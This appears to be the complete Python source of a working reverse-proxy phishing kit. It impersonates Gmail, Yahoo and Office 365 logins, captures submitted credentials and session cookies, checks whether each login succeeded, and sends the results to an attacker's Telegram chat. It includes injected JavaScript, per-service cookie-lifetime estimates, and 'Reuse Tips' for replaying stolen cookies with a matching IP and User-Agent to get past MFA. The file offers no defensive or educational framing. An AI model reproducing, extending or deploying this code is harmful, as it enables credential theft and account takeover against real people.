import logging
import ssl
import json
import httpx
from fastapi import FastAPI, Request, Response
from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
from datetime import datetime
from telegram import Bot
import uvicorn
import asyncio
import uuid

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%Y/%m/%d %H:%M:%S"
)

app = FastAPI()
Base = declarative_base()

class Capture(Base):
    __tablename__ = "captures"
    id = Column(Integer, primary_key=True)
    session_id = Column(String)
    data = Column(Text)
    timestamp = Column(DateTime, default=datetime.utcnow)

class Cookie(Base):
    __tablename__ = "cookies"
    id = Column(Integer, primary_key=True)
    session_id = Column(String)
    data = Column(Text)
    timestamp = Column(DateTime, default=datetime.utcnow)

engine = None
Session = None

def init_db():
    global engine, Session
    try:
        engine = create_engine("sqlite:///apexproxy.db")
        Base.metadata.create_all(engine)
        Session = sessionmaker(bind=engine)
        logging.info("Database initialized")
    except Exception:
        logging.error(f"DB init error")
        exit(1)

def save_data(session_id: str, data: str):
    try:
        session = Session()
        capture = Capture(session_id=session_id, data=data)
        session.add(capture)
        session.commit()
        session.close()
    except Exception:
        logging.error(f"DB save error")

def save_cookie(session_id: str, data: str):
    try:
        session = Session()
        cookie = Cookie(session_id=session_id, data=data)
        session.add(cookie)
        session.commit()
        session.close()
    except Exception:
        logging.error(f"Cookie save error")

async def get_geo_ip(ip: str) -> dict:
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(f"https://ipapi.co/{ip}/json/")
            response.raise_for_status()
            data = response.json()
            return {
                "ip": ip,
                "city": data.get("city", "Unknown"),
                "state": data.get("region", "Unknown"),
                "country": data.get("country_name", "Unknown")
            }
    except Exception:
        return {"ip": ip, "city": "Unknown", "state": "Unknown", "country": "Unknown"}

async def send_telegram_message(message: str, bot_token: str, chat_id: str):
    if not bot_token or not chat_id:
        return
    try:
        bot = Bot(token=bot_token)
        await bot.send_message(chat_id=chat_id, text=message, parse_mode="Markdown")
        logging.info("Telegram message sent")
    except Exception:
        logging.error(f"Telegram error")

@app.middleware("http")
async def proxy_middleware(request: Request, call_next):
    target_url = app.state.target_url
    js_rules = app.state.js_rules
    tracking_cookie = app.state.tracking_cookie
    capture_fields = app.state.capture_fields
    bot_token = app.state.telegram_bot_token
    chat_id = app.state.telegram_chat_id
    cookie_capture = app.state.cookie_capture
    session_id = request.cookies.get(tracking_cookie) or str(uuid.uuid4())[:16]
    client_ip = request.client.host

    geo_data = await get_geo_ip(client_ip)
    geo_str = f"IP: {geo_data['ip']}, City: {geo_data['city']}, State: {geo_data['state']}, Country: {geo_data['country']}"

    body = await request.body()
    body_str = body.decode("utf-8", errors="ignore")
    logging.info(f"{request.method} {request.url.path} - Intercepted (Session: {session_id}, {geo_str})")

    request_data = f"Method: {request.method}, Path: {request.url.path}, Body: {body_str}, Geo: {geo_str}"
    save_data(session_id, request_data)

    captured = []
    for field in capture_fields:
        if field.lower() in body_str.lower():
            captured.append(body_str)
            logging.info(f"Captured: {body_str} ({geo_str})")
            break
    if captured:
        save_data(session_id, "&".join(captured))

    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        headers = {k: v for k, v in request.headers.items() if k.lower() not in ["host"]}
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
        
        try:
            proxied_request = client.build_request(
                method=request.method,
                url=f"{target_url}{request.url.path}",
                headers=headers,
                content=body
            )
            response = await client.send(proxied_request)
        except Exception:
            return Response(status_code=500)

        content = response.content
        if js_rules and "text/html" in response.headers.get("content-type", ""):
            try:
                content = content.decode("utf-8").replace(
                    "</body>", f"<script>{js_rules};document.cookie='{tracking_cookie}={session_id};path=/;secure'</script></body>"
                ).encode("utf-8")
            except Exception:
                pass

        cookies = extract_cookies(response)
        filtered_cookies = [c for c in cookies if c["name"] in cookie_capture] if cookie_capture else cookies
        login_status, is_wrong_password = check_login_status(app.state.service, response, body_str)
        if captured or filtered_cookies:
            message_parts = [f"*Session*: {session_id}", f"*Geo*: {geo_str}"]
            if captured:
                creds = "&".join(captured)
                status = "Success" if login_status else ("Failed (Wrong Password)" if is_wrong_password else "Attempt")
                message_parts.append(f"*Credentials* ({status}): `{creds}`")
            if filtered_cookies:
                cookie_json = json.dumps(filtered_cookies, indent=2)
                cookie_netscape = "\n".join([f"{app.state.proxy_domain}\tTRUE\t/\tTRUE\t0\t{c['name']}\t{c['value']}" for c in filtered_cookies])
                save_cookie(session_id, cookie_json)
                logging.info(f"Cookies: {cookie_json} ({geo_str})")
                message_parts.append(f"*Cookies* (JSON):\n```json\n{cookie_json}\n```\n*Cookies* (Netscape):\n```\n{cookie_netscape}\n```")
                expiry_hint = estimate_cookie_expiry(app.state.service)
                message_parts.append(f"*Cookie Expiry*: {expiry_hint}")
                message_parts.append(f"*Reuse Tips*: Import cookies to {app.state.proxy_domain} using EditThisCookie. Match IP via VPN and User-Agent (Chrome/120.0.0.0).")
            message = "\n".join(message_parts)
            await send_telegram_message(message, bot_token, chat_id)

        response_headers = dict(response.headers)
        response_headers["Set-Cookie"] = f"{tracking_cookie}={session_id}; Path=/; Secure; HttpOnly"
        return Response(
            content=content,
            status_code=response.status_code,
            headers=response_headers
        )

def extract_cookies(response):
    return [{"name": k, "value": v} for k, v in response.cookies.items()]

def check_login_status(service: str, response: httpx.Response, body: str) -> tuple[bool, bool]:
    try:
        if service == "yahoo":
            if response.status_code == 200 and "sessionIndex" in response.text:
                return True, False
            if "error" in response.text.lower() and "invalid" in response.text.lower():
                return False, True
        elif service == "gmail":
            if response.status_code == 200 and "checkCookie" in response.text:
                return True, False
            if "error" in response.text.lower() and "password" in response.text.lower():
                return False, True
        elif service == "o365":
            if response.status_code == 200 and "sCtx" in response.text:
                return True, False
            if response.status_code == 401 or "AADSTS50126" in response.text:
                return False, True
        return False, False
    except Exception:
        return False, False

def estimate_cookie_expiry(service: str) -> str:
    if service == "gmail":
        return "Likely valid for days to weeks (e.g., SID lasts ~1-30 days). Reuse soon if high-risk IP."
    elif service == "o365":
        return "Likely valid for hours to months (e.g., ESTSAUTHPERSISTENT lasts ~90 days if 'stay signed in'). Reuse ASAP for short tokens."
    elif service == "yahoo":
        return "Likely valid for days to weeks (e.g., SID lasts ~14 days). Reuse soon if MFA enabled."
    return "Unknown duration. Reuse ASAP."

def start_modpy(config: dict, port: int = 443):
    app.state.target_url = config["target"]
    app.state.proxy_domain = config["proxyDomain"]
    app.state.js_rules = config["jsRules"]
    app.state.tracking_cookie = config["trackingCookie"]
    app.state.capture_fields = config["captureFields"]
    app.state.telegram_bot_token = config.get("telegramBotToken", "")
    app.state.telegram_chat_id = config.get("telegramChatId", "")
    app.state.service = config["serviceName"].lower().replace(" ", "")
    app.state.cookie_capture = config.get("cookieCapture", [])

    init_db()
    logging.info(f"Starting proxy on: :{port}")
    logging.info(f"Target: {config['target']}")
    logging.info(f"Proxy Domain: {config['proxyDomain']}")
    logging.info(f"Tracking via: {config['trackingCookie']}")
    if config["jsRules"]:
        logging.info("JavaScript injection enabled")
    if app.state.telegram_bot_token:
        logging.info("Telegram notifications enabled")

    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_context.load_cert_chain("certs/server.crt", "certs/server.key")
    uvicorn.run(app, host="0.0.0.0", port=port, ssl=ssl_context)